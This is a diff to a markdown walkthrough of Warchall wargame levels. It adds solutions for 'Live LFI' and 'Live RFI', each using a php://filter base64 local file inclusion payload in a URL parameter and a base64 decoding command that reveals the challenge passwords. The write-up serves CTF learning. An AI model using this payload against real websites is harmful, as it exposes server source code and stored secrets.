@@ -143,8 +143,41 @@ touch new
 ./pytong /home/user/username/new
 ```
 # 5. Live LFI
-# 6. Live LFI
+## In this challenge, you have to recover the password in a file named solution.php .
+* Click on the **Live LFI** challenge link and it will redirect you to a site.
+* Click on one of the two flags: the **English** flag or the **German** flag to change the language and the URL will change like this:
+  <pre>https://lfi.warchall.net/index.php?lang=en</pre>
+* Then change the URL as follows:
+  <pre>https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php</pre>
+* Here we use ***php://filter*** to introduce ***base64*** encoding, and we use base64 encoding to bypass any filters or security controls in place.
+* Then refresh and the content changes, and this is displayed:
+```plaintext
+PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K
+```
+> This is the content of `solution.php` that we still have to crack.
+* We are then going to open a terminal, putty in my case, and decode this long text in a directory for which we have 755 rights.
+* We will execute the following command:
+ ```
+echo "PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K" | base64 -d -i
 
+```
+* The password will be displayed on the console immediately after .
+# 6. Live RFI
+## This is basically the same as the Live LFI level.
+* There's a link to the ***Right-Fi*** challenge
+* By clicking on **EN** or **DE** at the top right of the site, the URL will change as this :
+ ```
+  https://rfi.warchall.net/index.php?lang=en
+```
+* Then we'll modify it :
+```
+  https://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php
+```
+* The home page will be displayed with a long message and Warning messages and, as in the previous level, we're going to decode the long, incoherent text as follows :
+```
+echo "PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K" | base64 -d -i
+```
+* The password will then be displayed in the bottom left-hand corner
 # 7. Tryouts
 > Find in /home/level/matrixman/13_tryouts
 > * In /home/level/matrixman/13_tryouts, there's a C language code called tryouts.c and its compiled version tryouts. There's also a solution.txt file that we don't have access to.
